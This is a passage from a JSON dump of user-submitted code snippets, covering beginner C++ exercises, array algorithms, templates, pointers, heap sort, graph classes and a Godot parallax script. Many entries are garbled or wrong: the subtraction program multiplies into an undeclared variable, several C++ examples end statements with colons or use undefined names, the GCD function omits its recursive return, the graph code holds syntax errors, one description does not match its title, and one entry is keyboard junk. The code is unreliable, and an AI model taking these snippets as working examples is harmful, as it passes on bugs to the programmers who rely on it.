    "description": "#include <iostream>#include <conio.h>using namespace std;int main (){    int firstNumber;    int secondNumber;    firstNumber=34;    secondNumber=35;    int multiple;    sum=firstNumber*secondNumber;    cout<<\"The multiplicatio of two Number Is \"<< multiple<<endl:    return 0;   }\n",
    "reg_date": "2021-10-12T11:36:47.000Z"
  },
  {
    "id": 214,
    "keyword": null,
    "link": null,
    "title": " Find the Subtraction of Two Numbers in C++",
    "description": "#include <iostream>#include <conio.h>using namespace std;int main (){    int first;    int second;    first=34;    second=35;    int subtraction;    sum=first*second;    cout<<\"The subtraction Number Is \"<< subtraction<<endl:    return 0;   }\n",
    "reg_date": "2021-10-12T11:36:47.000Z"
  },
  {
    "id": 215,
    "keyword": null,
    "link": null,
    "title": " Find the biggest element in the array",
    "description": "var peopleData = [      { name: \"Paul\", height: 180, age: 21 },     { name: \"Johnny\", height: 198, age: 43 },     { name: \"Brad\", height: 172, age: 49 },     { name: \"Dwayne\", height: 166, age: 15 } ];  //Find biggest height number var maxHeight = 0;  for (var i = 0; i < heights.length; i++) {     if (peopleData[i].height > maxHeight) {         maxHeight = peopleData[i].height;       //if you console.log(maxHeight); you should get 198     } }\nfunction maisBaratosQue(valor, precos) {    return precos.filter(p => p <= valor); }\n #include <iostream> using namespace std; int main() {     // input     int n;     cin >> n;     int arr[10];     int maxNum;     for (int i = 0; i < n; i++)     {         cin >> arr[i];     }      // Algo     maxNum = arr[0];     for (int i = 0; i < n; i++)     {         if (maxNum < arr[i])         {             maxNum = arr[i];         }     }      // output     cout << maxNum;     // for (int i = 0; i < n; i++)     // {     //     cout << arr[i] << \" \";     // }      return 0; }\n",
    "reg_date": "2021-10-12T11:36:47.000Z"
  },
  {
    "id": 216,
    "keyword": null,
    "link": null,
    "title": " Find the duplicate in an array of N integers.",
    "description": "npm i find-array-duplicates  import duplicates from 'find-array-duplicates'  const names = [  { 'age': 36, 'name': 'Bob' },  { 'age': 40, 'name': 'Harry' },  { 'age': 1,  'name': 'Bob' } ]   duplicates(names, 'name').single() // => { 'age': 36, 'name': 'Bob' }\n// 287. Find the Duplicate Number // Medium  // Given an array nums containing n + 1 integers where each integer is between 1 and n (inclusive), prove that at least one duplicate number must exist. Assume that there is only one duplicate number, find the duplicate one.  // Example 1:  // Input: [1,3,4,2,2] // Output: 2 // Example 2:  // Input: [3,1,3,4,2] // Output: 3 // Note:  // You must not modify the array (assume the array is read only). // You must use only constant, O(1) extra space. // Your runtime complexity should be less than O(n2). // There is only one duplicate number in the array, but it could be repeated more than once.  class Solution { public:     int findDuplicate(vector<int>& nums) {         int n=nums.size();         int s=nums[0];         int f=nums[nums[0]];         while(s!=f) {             s=nums[s];             f=nums[nums[f]];         }         f=0;         while(s!=f) {             s=nums[s];             f=nums[f];         }         return s;              } };\n/*This method is all in one  *you can find following things: *finding Duplicate elements in array *array without duplicate elements *number of duplicate elements *numbers of pair of dulicate with  repeatation */ //let given array = [2,3,2,5,3]    public static void findDuplicateArray(int [] array)    { \t   int size = array.length;      //creating array to hold count frequency of array elements \t   int [] countFrequency = new int[size];      // filling countFrequency with -1 value on every index \t   for(int i = 0; i < size; i++) \t   { \t\t   countFrequency[i] = -1;//[-1,-1,-1,-1,-1...] \t   }            int count = 1; \t   for(int i = 0; i < size; i++)  \t   {          //check countFrequency[i] != 0 because 0 means it already counted \t\t  if(countFrequency[i] != 0) \t\t  { \t\t   for(int j = i+1; j < size; j++)   \t\t   {              //if array[i] == array[j] then increase count value \t\t\t   if(array[i] == array[j]) \t\t\t   { \t\t\t\t   count++;                  /*only at first occurence of an element count value                   *will be increased else everywhere it  will be 0                   */ \t\t\t\t   countFrequency[j]= 0;\t\t\t\t    \t\t\t   } \t\t   } \t\t   countFrequency[i] = count; \t      } \t\t  count = 1; \t   }      // array         = [2,3,2,5,3]      //countFrequency = [2,2,0,1,0] \t   System.out.println(\"array without duplicate elements\"); \t\t    for(int i = 0; i < array.length; i++) \t\t    { \t\t    \tif(countFrequency[i] >= 1) \t\t    \tSystem.out.print(array[i] + \" \"); \t\t    } \t\t    System.out.println(); \t\t     \t   System.out.println(\"duplicate elements in array\"); \t\t    for(int i = 0; i < array.length; i++) \t\t    { \t\t    \tif(countFrequency[i]/2 >= 1) \t\t    \tSystem.out.print(array[i] + \" \"); \t\t    } \t        System.out.println(); \t\t     \t   System.out.println(\"number of duplicate elements\"); \t\t     count = 0; \t\t    for(int i = 0; i < array.length; i++) \t\t    {\t    \t \t\t    \tif(countFrequency[i]/2 >= 1) \t\t            count++; \t\t    } \t\t    System.out.print(count); \t\t    System.out.println(); \t\t     \t  System.out.println(\"numbers of pair of dulicate with  repeatation\"); \t\t     count = 0; \t\t    for(int i = 0; i < array.length; i++) \t\t    { \t\t    \tif(countFrequency[i] >= 2) \t\t    \t{ \t\t    \t\tint div = countFrequency[i]/2; \t\t    \t\tcount+=div; \t\t    \t} \t\t    } \t\t    System.out.println(count); \t\t\t \t\t    int [] array3 = new int [array.length]; \t\t    for(int i = 0; i < array.length; i++) \t\t    { \t\t    \tfor(int j = 0; j < countFrequency[i]; j++) \t\t    \t{ \t\t    \t\tarray3[i]= array[i]; \t\t    \t} \t\t    }    }\n",
    "reg_date": "2021-10-12T11:36:47.000Z"
  },
  {
    "id": 217,
    "keyword": null,
    "link": null,
    "title": " Find the max element along with it's index in c++",
    "description": "int main() {     int num, arr[10];     int x, y, a, b;      cin >> num;      for (int i = 0; i < num; i++)     {         cin >> arr[i];     }      cout << \"Max element Index: \" << max_element(arr, arr + num) - arr;      return 0; } \n",
    "reg_date": "2021-10-12T11:36:47.000Z"
  },
  {
    "id": 218,
    "keyword": null,
    "link": null,
    "title": " Find the two non-repeating elements in an array of repeating elements/ Unique Numbers 2",
    "description": "#include <iostream>  using namespace std;  int main() {     int n;     cout<<\"enter the size of the array:\"<<endl;     cin>>n;     int arr[n];     cout<<\"enter the elements of the array:\"<<endl;     for(int i=0;i<n;i++)     {         cin>>arr[i];     }     int res=0;     int x=0;     int y=0;     int setbit;     for(int i=0;i<n;i++)     {         res=res^arr[i];     }     setbit=res&(~(res)+1);     for(int i=0;i<n;i++)     {         if(arr[i]&setbit)   //xor the first set         {             x=x^arr[i];         }         else            //xor the second set         {             y=y^arr[i];         }     }     cout<<x<<\" \"<<y<<endl;     return 0; } \nTime Complexity:O(n) and space complexity:o(1)\n",
    "reg_date": "2021-10-12T11:36:47.000Z"
  },
  {
    "id": 219,
    "keyword": null,
    "link": null,
    "title": " Finding Even And Odd Number Program in C++",
    "description": "#include <iostream>using namespace std;int main (){    int a ;    int result;    cout <<\"Enter a number=\";    cin>>a;    result =a%2;    if (r==1)    cout<<a<<\" is odd number.\";    else     cout <<a<<\" is even.\";    return 0;}\n",
    "reg_date": "2021-10-12T11:36:47.000Z"
  },
  {
    "id": 220,
    "keyword": null,
    "link": null,
    "title": " Finding The Absolute Value Of An Integer in C++",
    "description": "#include <iostream>#include <conio.h>using namespace std;int main (){    int Number;    Number=34;    int absoulteval;    if (Number<0)    absoulteval=-absoulteval;    else     absoulteval=Number;    cout<<\"The Absolute value of \"<<Number<<\" is \" absoultevalue:    return 0;}\n",
    "reg_date": "2021-10-12T11:36:48.000Z"
  },
  {
    "id": 221,
    "keyword": null,
    "link": null,
    "title": " Finding The Sum Of two Integers in C++",
    "description": "#include <iostream>#include <conio.h>using namespace std;int main (){    int first;    int second;    first=34;    second=35;    int sum;    sum=first+second;    cout<<\"The Sum of two Number Is \"<< sum<<endl:    return 0;   }\n",
    "reg_date": "2021-10-12T11:36:48.000Z"
  },
  {
    "id": 222,
    "keyword": null,
    "link": null,
    "title": " Finding the Prime Numer In C++",
    "description": "#include <iostream>#include <conio.h>using namespace std;int main (){    int i,n;    int count =0;    cout <<\"enter a number=\";    cin >>n;    for (i=1;i<=n;i++)    {        if (n%i==0)        count++;    }    if (count==2)    cout<<n<<\"prime number.\";    else     cout <<n<<\"not prime number.\";    return 0;}\n",
    "reg_date": "2021-10-12T11:36:48.000Z"
  },
  {
    "id": 223,
    "keyword": null,
    "link": null,
    "title": " Fisher–Yates shuffle Algorithm c++",
    "description": "default_random_engine seed; vector<int> shuffle(vector<int>arr) {                  for(int i =arr.size()-1 ;i>0;i--)         {                        int indx =  uniform_int_distribution<int>(0, i)(seed);                 swap(arr[i],arr[indx]);                          }         return arr;     } \n",
    "reg_date": "2021-10-12T11:36:48.000Z"
  },
  {
    "id": 224,
    "keyword": null,
    "link": null,
    "title": " For auto map C",
    "description": "//Since c++11 for (const auto& kv : myMap) {     cout << kv.first << \" has value \" << kv.second << endl; } //Since c++17 for (auto& [key, value]: myMap) {     cout << key << \" has value \" << value << endl; }\n",
    "reg_date": "2021-10-12T11:36:48.000Z"
  },
  {
    "id": 225,
    "keyword": null,
    "link": null,
    "title": " Function Template\twith multiple parameters",
    "description": "#include <iostream> using namespace std;  template <class TFirst, class TSecond>  //returns smaller number TFirst smaller(TFirst A, TSecond B) {  \treturn (A<B?A:B); //if A is less then B then return A; if not, return B }  int main() {  \tint x = 58; \tdouble y = 56.78;   \tstd::cout << smaller(x, y) << endl; //TFisrt = int, TSecond = double \tstd::cout << smaller(y, x) << endl; //TFisrt = double, TSecond = int }\n",
    "reg_date": "2021-10-12T11:36:48.000Z"
  },
  {
    "id": 226,
    "keyword": null,
    "link": null,
    "title": " Function Template in c++",
    "description": "template <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }\n#include <iostream> using namespace std;  template <typename T> void Swap(T &n1, T &n2) { \tT temp; \ttemp = n1; \tn1 = n2; \tn2 = temp; }  int main() { \tint i1 = 1, i2 = 2; \tfloat f1 = 1.1, f2 = 2.2; \tchar c1 = 'a', c2 = 'b';  \tcout << \"Before passing data to function template.\\n\"; \tcout << \"i1 = \" << i1 << \"\\ni2 = \" << i2; \tcout << \"\\nf1 = \" << f1 << \"\\nf2 = \" << f2; \tcout << \"\\nc1 = \" << c1 << \"\\nc2 = \" << c2;  \tSwap(i1, i2); \tSwap(f1, f2); \tSwap(c1, c2);          cout << \"\\n\\nAfter passing data to function template.\\n\"; \tcout << \"i1 = \" << i1 << \"\\ni2 = \" << i2; \tcout << \"\\nf1 = \" << f1 << \"\\nf2 = \" << f2; \tcout << \"\\nc1 = \" << c1 << \"\\nc2 = \" << c2;  \treturn 0; } \n// template specialization #include <iostream> using namespace std;  // class template: template <class T> class mycontainer {     T element;   public:     mycontainer (T arg) {element=arg;}     T increase () {return ++element;} };  // class template specialization: template <> class mycontainer <char> {     char element;   public:     mycontainer (char arg) {element=arg;}     char uppercase ()     {       if ((element>='a')&&(element<='z'))       element+='A'-'a';       return element;     } };  int main () {   mycontainer<int> myint (7);   mycontainer<char> mychar ('j');   cout << myint.increase() << endl;   cout << mychar.uppercase() << endl;   return 0; }\n// If two characters are passed to function template, character with larger ASCII value is displayed.  #include <iostream> using namespace std;  // template function template <typename T> T Large(T n1, T n2) { \treturn (n1 > n2) ? n1 : n2; }  int main() { \tint i1, i2; \tfloat f1, f2; \tchar c1, c2;  \tcout << \"Enter two integers:\\n\"; \tcin >> i1 >> i2; \tcout << Large(i1, i2) <<\" is larger.\" << endl;  \tcout << \"\\nEnter two floating-point numbers:\\n\"; \tcin >> f1 >> f2; \tcout << Large(f1, f2) <<\" is larger.\" << endl;  \tcout << \"\\nEnter two characters:\\n\"; \tcin >> c1 >> c2; \tcout << Large(c1, c2) << \" has larger ASCII value.\";  \treturn 0; }\n// function template in c++ #include <iostream> using namespace std; float funAvg(int a, int b){     float avg = (a+b)/2.0;     return avg; } float funAvg2(int a, float b){     float avg2 = (a+b)/2.0;     return avg2; }  //function template in c++  template<class T1 , class T2> float fun(T1 a, T2 b){     float avg2 = (a+b)/2.0;     return avg2; }  int main(){       float a;     a = funAvg(22 , 7);     printf(\"The average of these number is %.3f \",a);     cout<<endl;     float a1;     a1 = funAvg2(11 , 8.6);     printf(\"The average of these number is %.3f \",a1);     cout<<endl;     // float T;     // T = fun(11 , 8.6f);     // printf(\"The average of these number is %.3f \",T);     // cout<<endl;     // ---------------------function template in c++-----------------     float T;     T = fun(11 , 98);     printf(\"The average of these number is %.3f \",T);       return 0; }\ntemplate<class T1 , class T2> float fun(T1 a, T2 b){     float avg2 = (a+b)/2.0;     return avg2; }\n",
    "reg_date": "2021-10-12T11:36:48.000Z"
  },
  {
    "id": 227,
    "keyword": null,
    "link": null,
    "title": " Function pointer C++",
    "description": "int myvar = 6; int pointer = &myvar; // adress of myvar int value = *pointer; // the value the pointer points to: 6\n#include <iostream>  using namespace std;  int main () {    int  var = 20;   // actual variable declaration.    int  *ip;        // pointer variable      ip = &var;       // store address of var in pointer variable     cout << \"Value of var variable: \";     cout << var << endl; //Prints \"20\"     // print the address stored in ip pointer variable    cout << \"Address stored in ip variable: \";    cout << ip << endl; //Prints \"b7f8yufs78fds\"     // access the value at the address available in pointer    cout << \"Value of *ip variable: \";    cout << *ip << endl; //Prints \"20\"     return 0; }\nvoid simple_pointer_examples() {     int   a;  // a can contain an integer \tint*  x;  // x can contain the memory address of an integer.   \tchar* y;  // y can contain the memory address of a char.   \tFoo*  z;  // z can contain the memory address of a Foo object.         a = 10;     x = &a;   // '&a' extracts address of a         std::cout <<  x << std::endl; // memory address of a => 0x7ffe9e25bffc     std::cout << *x << std::endl; //          value of a => 10 }\nEvery object in C++ has access to its own address through an important pointer called this pointer.  The this pointer is an implicit parameter to all member functions.  Therefore, inside a member function,  this may be used to refer to the invoking object.  Friend functions do not have a this pointer,  because friends are not members of a class.  Only member functions have a this pointer.\nvoid one() { cout << \"One\\n\"; } void two() { cout << \"Two\\n\"; }   int main() { \tvoid (*fptr)(); //Declare a function pointer to voids with no params  \tfptr = &one; //fptr -> one \t*fptr(); //=> one()  \tfptr = &two; //fptr -> two \t*fptr(); //=> two()  \treturn 0; } \n#include <iostream>  using namespace std; // isualize this on http://pythontutor.com/cpp.html#mode=edit int main() {    double* account_pointer = new double;    *account_pointer = 1000;    cout << \"Allocated one new variable containing \" << *account_pointer       << endl;    cout << endl;     int n = 10;    double* account_array = new double[n];    for (int i = 0; i < n; i++)    {       account_array[i] = 1000 * i;    }       cout << \"Allocated an array of size \" << n << endl;    for (int i = 0; i < n; i++)    {       cout << i << \": \" << account_array[i] << endl;    }    cout << endl;     // Doubling the array capacity     double* bigger_array = new double[2 * n];    for (int i = 0; i < n; i++)    {       bigger_array[i] = account_array[i];    }    delete[] account_array; // Deleting smaller array    account_array = bigger_array;    n = 2 * n;     cout << \"Now there is room for an additional element:\" << endl;    account_array[10] = 10000;    cout << 10 << \": \" << account_array[10] << endl;            delete account_pointer;    delete[] account_array; // Deleting larger array        return 0; }\n",
    "reg_date": "2021-10-12T11:36:49.000Z"
  },
  {
    "id": 228,
    "keyword": null,
    "link": null,
    "title": " Function to calculate compound interest in C++",
    "description": "float CoumpoundInterest (float AmountP,float rateP, int termP)//Define the function and FORMAL parameters {     rateP=rateP/100;     float calculation = AmountP * pow(1+rateP,termP);     return calculation;  } //CALLING THE FUNCTION IN THE MAIN PROGRAM:   //Declaration of ACTUAL paramters  float amount,rate, total; int term;  //Assignment statement to call the function.  cout.setf(ios::fixed); cout.precision(2); total=CompoundInterets(amount,rate,term)  //OUTPUT cout<<total;   \n",
    "reg_date": "2021-10-12T11:36:49.000Z"
  },
  {
    "id": 229,
    "keyword": null,
    "link": null,
    "title": " Function with Parameters",
    "description": "// program to print a text  #include <iostream> using namespace std;  // display a number void displayNum(int n1, float n2) {     cout << \"The int number is \" << n1;     cout << \"The double number is \" << n2; }  int main() {            int num1 = 5;      double num2 = 5.5;      // calling the function     displayNum(num1, num2);      return 0; }\n",
    "reg_date": "2021-10-12T11:36:49.000Z"
  },
  {
    "id": 230,
    "keyword": null,
    "link": null,
    "title": " GCD2",
    "description": "#include<stdio.h> char b[300]; int rem(int a) {         int p=0,i;         for(i=0;b[i]!= '\\0';i++) p = ((b[i]-'0')+p*10) %a;         return p; }  int gcd(int a,int b) {         if(b==0) return a;         else gcd(b,a%b); }  int main() {         int i,j,a;         scanf(\"%d\",&i);         while(i--) {                 scanf(\"%d %s\",&a,b);                 if(a == 0) printf(\"%s\\n\",b);                 else {                         int p = rem(a);                         printf(\"%d\\n\",gcd(a,p));                 }         }         return 0; } \n",
    "reg_date": "2021-10-12T11:36:49.000Z"
  },
  {
    "id": 231,
    "keyword": null,
    "link": null,
    "title": " GetCurrentThreadId c",
    "description": "Retrieves the thread identifier of the calling thread.    DWORD GetCurrentThreadId();\n",
    "reg_date": "2021-10-12T11:36:49.000Z"
  },
  {
    "id": 232,
    "keyword": null,
    "link": null,
    "title": " Get handle in C++",
    "description": "hwnd = FindWindow(NULL,(LPCWSTR)\"NAMEOFWINDOW\");\n",
    "reg_date": "2021-10-12T11:36:49.000Z"
  },
  {
    "id": 233,
    "keyword": null,
    "link": null,
    "title": " Get input for array of unknown length/size in c++",
    "description": "#include<iostream> #include<sstream>  using namespace std;  int main() { \tstring s;     getline(cin, s);          int data     istringstream iss(s);     while(iss>>data)     \tcout<<data<<\" \"; \treturn 0; }\n",
    "reg_date": "2021-10-12T11:36:49.000Z"
  },
  {
    "id": 234,
    "keyword": null,
    "link": null,
    "title": " Get rid of those includes c++",
    "description": "#include <bits/stdc++.h> //This library includes many of libraries we do need in contest\n",
    "reg_date": "2021-10-12T11:36:49.000Z"
  },
  {
    "id": 235,
    "keyword": null,
    "link": null,
    "title": " Get the absolute path of a boost filePath as a string",
    "description": "boost::filesystem::absolute(path).string() \n",
    "reg_date": "2021-10-12T11:36:49.000Z"
  },
  {
    "id": 236,
    "keyword": null,
    "link": null,
    "title": " Given bigger NxN matrix and a smaller MxM matrix print TRUE if the smaller matrix can be found in the bigger matrix else print FALSE",
    "description": "eg) a = 1010 b = 11001       o/p  100011\t               b.The two numbers were given in base n  \teg) a = 123  b = 13  n = 4 \t      o/p  202\n",
    "reg_date": "2021-10-12T11:36:49.000Z"
  },
  {
    "id": 237,
    "keyword": null,
    "link": null,
    "title": " Given the following declarations below. Write a loop to read a list of numbers from the keyboard terminated by -999 and store the even numbers (skip over the odd numbers) in the vector v.",
    "description": "cin >> x;  while (x != -999) {       if (x % 2 == 0)        {            v.push_back(x);       }      cin >> x;  }\n",
    "reg_date": "2021-10-12T11:36:49.000Z"
  },
  {
    "id": 238,
    "keyword": null,
    "link": null,
    "title": " GoPro camera for kids aus",
    "description": "hjjhjjhhj\n",
    "reg_date": "2021-10-12T11:36:50.000Z"
  },
  {
    "id": 239,
    "keyword": null,
    "link": null,
    "title": " Godot parallax loop",
    "description": "# Displays a background texture which loops infinitely in all directions. # It should be put on a Node2D under the root of your scene. # Differences from ParallaxBackground node: # - Just drop a texture on it, done # - No need to have a large enough image, tiling fills all visible area # - Works on the same layer, adjust Z as you see fit # - Focused on camera center, so zooming won't trouble the parallax. (TODO zoom parallax?)  extends Node2D  # Background texture to repeat export(Texture) var texture = null # Parallax motion speed.  # The closer to zero, the slower the background will move. # (1,1) is in sync, above is faster. export var parallax = Vector2(0.5, 0.5)  var _tiles_x = 0 var _tiles_y = 0   func _ready():     update_tiles()     _update_position()     set_process(true)  # If zoom changes too much in your game, # you should call this, then update() to redraw tiles to the right range. func update_tiles():     _calculate_required_tiles()     var ntiles = _calculate_required_tiles()     _tiles_x = ntiles.x     _tiles_y = ntiles.y     #update()   func _process(delta):     _update_position()   func _update_position():     var cam_pos = _get_camera_center()     #print(\"cam_zoom = \" + str(Vector2(1,1)/get_canvas_transform().get_scale()))      var parallax_pos = -cam_pos * parallax      var tsize = texture.get_size()     var tiled_pos = parallax_pos / tsize     var floored_parallax_pos = tsize * Vector2(floor(tiled_pos.x), floor(tiled_pos.y))      var new_pos = cam_pos + (parallax_pos - floored_parallax_pos)      set_pos(new_pos)   func _get_camera_center():     var ctrans = get_canvas_transform()     var top_left = -ctrans.get_origin()     var vsize = get_viewport_rect().size     var center = (top_left + 0.5*vsize) / ctrans.get_scale()     return center   func _calculate_required_tiles():     var tile_size = texture.get_size() * get_scale()     var view_size = get_viewport_rect().size / get_canvas_transform().get_scale()     var fn = view_size / tile_size     return Vector2(ceil(fn.x), ceil(fn.y))   func _draw():     var tsize = texture.get_size()     var nx = _tiles_x / 2 + 1     var ny = _tiles_y / 2 + 1     # Draw tiles around the center     for y in range(-ny, ny):         for x in range(-nx, nx):             draw_texture(texture, Vector2(x,y) * tsize)      #draw_rect(Rect2(Vector2(0,0), Vector2(8,8)), Color(1,0,0)) \n",
    "reg_date": "2021-10-12T11:36:50.000Z"
  },
  {
    "id": 240,
    "keyword": null,
    "link": null,
    "title": " Graph Adjacent Node in c++",
    "description": "#include <iostream> using namespace std;  struct adjNode {     int val, cost;     adjNode* next; };  struct graphEdge {     int start_ver, end_ver, weight; }; class DiaGraph{         adjNode* getAdjListNode(int value, int weight, adjNode* head)   {         adjNode* newNode = new adjNode;         newNode->val = value;         newNode->cost = weight;                   newNode->next = head;          return newNode;     }     int N;   public:     adjNode **head;                DiaGraph(graphEdge edges[], int n, int N)  {               head = new adjNode*[N]();         this->N = N;                 for (int i = 0; i < N; ++i)             head[i] = nullptr;                for (unsigned i = 0; i < n; i++)  {             int start_ver = edges[i].start_ver;             int end_ver = edges[i].end_ver;             int weight = edges[i].weight;                     adjNode* newNode = getAdjListNode(end_ver, weight, head[start_ver]);                                              head[start_ver] = newNode;              }     }          ~DiaGraph() {     for (int i = 0; i < N; i++)         delete[] head[i];         delete[] head;      } };  void display_AdjList(adjNode* ptr, int i) {     while (ptr != nullptr) {         cout << \"(\" << i << \", \" << ptr->val             << \", \" << ptr->cost << \") \";         ptr = ptr->next;     }     cout << endl; }  int main() {          graphEdge edges[] = {                {0,1,2},{0,2,4},{1,4,3},{2,3,2},{3,1,4},{4,3,3}     };     int N = 6;           int n = sizeof(edges)/sizeof(edges[0]);         DiaGraph diagraph(edges, n, N);        cout<<\"Graph adjacency list \"<<endl<<\"(start_vertex, end_vertex, weight):\"<<endl;     for (int i = 0; i < N; i++)     {                  display_AdjList(diagraph.head[i], i);     }     return 0; }\n//code  by Soumyadeep Ghosh //insta : @soumyadepp //linked in: https://www.linkedin.com/in/soumyadeep-ghosh-90a1951b6/  #include <bits/stdc++.h> using namespace std;  //undirected weighted graph and all functions class WeightedGraph {   vector< pair<int,int> >*adjacency_list;   int vertices;   public:   WeightedGraph(int n)   {     vertices=n;     adjacency_list=new vector< pair<int,int> >[n];   }   void add_edge(int v1,int v2,int wt);   void dfsHelper(int src,bool visited[]);   void dfs(int src);   void bfs(int src);   int minDistance(vector<int>dist,bool visited[]);     void djisktra(int src);   void display_graph(); };  int main() {   //graph of five vertices   WeightedGraph wg1(5);   //adding edges   wg1.add_edge(0,1,10);   wg1.add_edge(1,2,20);   wg1.add_edge(2,3,30);   wg1.add_edge(1,3,40);   wg1.add_edge(2,4,100);   wg1.add_edge(4,0,10);   //displaying the graph   wg1.display_graph();   //dfs from vertex 0   wg1.dfs(0);   //bfs from vertex 0   wg1.bfs(0);   //djikstra   for(int i=0;i<5;i++)   {     djikstra(i);   }   return 0; } //function definitions  void WeightedGraph::add_edge(int v1,int v2,int wt) {   /*push the other vertex into the adjacency list of the given vertex   and vice versa. If it would have been a directed graph,   only the first line would be enough   */   adjacency_list[v1].push_back(make_pair(v2,wt));   adjacency_list[v2].push_back(make_pair(v1,wt)); }  void WeightedGraph::dfsHelper(int src,bool visited[]) {   visited[src]=true;   cout<<src<<\" \";   for(vector<int>::iterator it=adjacency_list.begin();i!=adjacency_list.end();it++)   {     if(!visited[it->first]);       dfsHelper(it->first,visited);   } } void WeightedGraph::dfs(int src) {   bool visited[vertices];   for(int i=0;i<vertices;i++)     visited[i]=false;   dfsHelper(src,visited); } void WeightedGraph::bfs(int src) {   bool visited[vertices];   for(int i=0;i<vertices;i++)     visited[i]=false;   cout<<src<<\" \";   visited[src]=true;   queue<int>helper;   helper.push(src);   while(!helper.empty())   {     src=helper.front();     for(vector<int>::iterator it=adjacency_list[src].begin();it!+adjacency_list[src].end();it++)     {       if(!visited[it->first])       {         visited[it->first]=true;         cout<<it->first<<\" \";         helper.push(it->first);       }     }     helper.pop();   } }  int WeightedGraph::minDistance(vector<int>dist,bool visited[])   {     int min=INT_MAX;     int minIndex=INT_MAX;     for(int i=0;i<N;i++)     {       if(!visited[i]&&dist[i]<=min)       {         min=dist[i];         minIndex=i;       }     }     return minIndex;   }   void WeightedGraph::djikstra(int src)   {     vector<int>dist;     bool visited[vertices];     for(int i=0;i<vertices;i++)     {       dist.push_back(INT_MAX);       visited[i]=false;     }     visited[src]=true;     dist[src]=0;     for(int i=0;i<vertices-1;i++)     {       int k=minDistance(dist,visited);       visited[k]=true;       for(int j=0;j<vertices;j++)       {         if(!visited[i]&&dist[i]!=INT_MAX&&adjacency_list[i][j].second+dist[i]<dist[j])         {           dist[j]=adjacency_list[i][j].second+dist[i];         }       }     }     for(int i=0;i<dist.size();i++)       cout<<dist[i]<<\" \";          cout<<endl;   } void WeightedGraph::display_graph() {   int a,b;   //first loop to traverse across vertices   for(int i=0;i<vertices;i++)   {       cout<<\"Adjacency list of vertex \"<<i<<endl;     //second loop to traverse across the adjacency list of some vertex i     for(auto it=adjacency_list[i].begin();it!=adjacency_list[i].end();it++)     {       //set a as the vertex number and b as the weight       a=it->first;       b=it->second;       cout<<\"Vertex : \"<<a<<\" Weight : \"<<b<<endl;     }     cout<<endl;   } }  //thank you! \n",
    "reg_date": "2021-10-12T11:36:50.000Z"
  },
  {
    "id": 241,
    "keyword": null,
    "link": null,
    "title": " HOW TO TURN LINK TO BUTTON IN MVC",
    "description": "@Html.ActionLink(\"Create A New Invoice\", \"Create\", \"Travel\", null, new { @class = \"btn btn-primary btn-large\" })\n",
    "reg_date": "2021-10-12T11:36:50.000Z"
  },
  {
    "id": 242,
    "keyword": null,
    "link": null,
    "title": " Happy New Year!",
    "description": "if date == 1/1/2021: \t\tprint(\"Happy New Year!!\")\t\nThere are two types of programmers,  HTML programmers  and real programmers  Happy new year to both of them\nHappy new year to all those aspiring to be a programmer, and to those who  have seen freams for this new year. bless ya\nhappy new years for all of you!!! i hope that this.year will be a true success\nalert(\"Happy New Year!\")\nHave a happy 2021! \ntry {   Year year2020 = new Year(2020);   year2020.do(); } catch Covid19 {   System.out.println(\"Wow, 2020 sucked\"); } finally {   Year year2021 = new Year(2021);   System.out.println(\"Happy new year!\"); }\nHello world \"Happy new year\" \nHappy new year to all\nif(!2020) \tDebug.Log(\"Happy New Year! :D\")\n",
    "reg_date": "2021-10-12T11:36:50.000Z"
  },
  {
    "id": 243,
    "keyword": null,
    "link": null,
    "title": " Header for INT MIN",
    "description": "#include<climits> //or #include<limits.h>\n",
    "reg_date": "2021-10-12T11:36:50.000Z"
  },
  {
    "id": 244,
    "keyword": null,
    "link": null,
    "title": " Heap sort in c++",
    "description": "#include <iostream>   using namespace std;    void heapify(int arr[], int n, int i) {     int largest = i;      int l = 2 * i + 1;     int r = 2 * i + 2;            if (l < n && arr[l] > arr[largest])         largest = l;            if (r < n && arr[r] > arr[largest])         largest = r;            if (largest != i) {         swap(arr[i], arr[largest]);                heapify(arr, n, largest);     } }    void heapSort(int arr[], int n) {      for (int i = n / 2 - 1; i >= 0; i--)         heapify(arr, n, i);        for (int i = n - 1; i > 0; i--) {                 swap(arr[0], arr[i]);         heapify(arr, i, 0);     } }    void printArray(int arr[], int n) {     for (int i = 0; i < n; ++i)         cout << arr[i] << \" \";     cout << \"\\n\"; }    int main() {     int arr[] = { 12, 11, 13, 5, 6, 7 };     int n = sizeof(arr) / sizeof(arr[0]);       heapSort(arr, n);       cout << \"Sorted array is \\n\";     printArray(arr, n); }\nImplementation of heap sort in C:  #include <stdio.h> int main() {    int heap[10], array_size, i, j, c, root, temporary;    printf(\"\\n Enter size of array to be sorted :\");    scanf(\"%d\", &array_size);    printf(\"\\n Enter the elements of array : \");    for (i = 0; i < array_size; i++)       scanf(\"%d\", &heap[i]);    for (i = 1; i < array_size; i++)    {        c = i;        do        {            root = (c - 1) / 2;                        if (heap[root] < heap[c])   /* to create MAX heap array */            {                                  // if child is greater than parent swap them                temporary = heap[root];      // as structure is of complete binary tree                heap[root] = heap[c];     // it took logn steps to reach from root to leaf                heap[c] = temporary;            }            c = root;        } while (c != 0);    }    printf(\"Heap array : \");    for (i = 0; i < array_size; i++)        printf(\"%d\\t \", heap[i]);         //printing the heap array    for (j = array_size - 1; j >= 0; j--)    {        temporary = heap[0];        heap[0] = heap[j] ;   /* swap max element with rightmost leaf element */        heap[j] = temporary;        root = 0;        do        {            c = 2 * root + 1;    /* left node of root element */            if ((heap[c] < heap[c + 1]) && c < j-1)                c++;            if (heap[root]<heap[c] && c<j)    /* again rearrange to max heap array */            {                temporary = heap[root];                heap[root] = heap[c];                heap[c] = temporary;            }            root = c;        } while (c < j);    }    printf(\"\\n The sorted array is : \");    for (i = 0; i < array_size; i++)       printf(\"\\t %d\", heap[i]); }\n",
    "reg_date": "2021-10-12T11:36:50.000Z"
  },
  {
    "id": 245,
    "keyword": null,
    "link": null,
    "title": " Height of a binary tree",
